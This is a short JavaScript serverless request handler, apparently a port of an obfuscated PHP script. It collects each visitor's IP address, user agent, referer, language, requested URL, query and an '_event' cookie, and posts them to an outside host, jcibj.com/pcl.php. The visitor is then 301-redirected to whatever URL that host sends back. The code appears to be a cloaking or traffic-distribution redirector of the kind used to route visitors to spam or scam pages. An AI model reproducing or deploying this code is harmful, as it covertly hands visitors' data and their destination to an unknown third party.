export default async function handler(req, res) {
  const date = new Date().toISOString();
  const id = "499178";
  const uid = "yrez8stiipeall2mn4qv94nec";
  const query = req.query;
  const queryString = new URLSearchParams(query).toString();
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const ua = req.headers["user-agent"];
  const referer = req.headers.referer;
  const language = req.headers["accept-language"];

  const postData = {
    date,
    lan: language,
    ref: referer,
    ip: ip,
    ipr: ip,
    sn: req.headers.host,
    requestUri: req.url,
    query: queryString,
    ua: ua,
    co: req.cookies?._event || "",
    user_id: uid,
    id: id,
  };

  const endpoint = "https://jcibj.com/pcl.php"; // Decoded from the obfuscated PHP version

  try {
    const response = await fetch(endpoint, {
      method: "POST",
      body: new URLSearchParams(postData),
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
    });

    const resultText = await response.text();
    const arr = resultText.split(",");

    let redirectUrl = arr[1];
    let q = queryString ? (redirectUrl.includes("?") ? "&" + queryString : "?" + queryString) : "";

    if (arr[0] === "true") {
      res.setHeader("Set-Cookie", `_event=${arr[6]}; Path=/; Max-Age=${60 * 60 * 24 * arr[3]}`);
      res.writeHead(301, { Location: redirectUrl + q });
    } else {
      res.writeHead(301, { Location: redirectUrl + q });
    }

    res.end();
  } catch (err) {
    console.error("Redirect error:", err);
    res.status(500).send("Server error");
  }
}
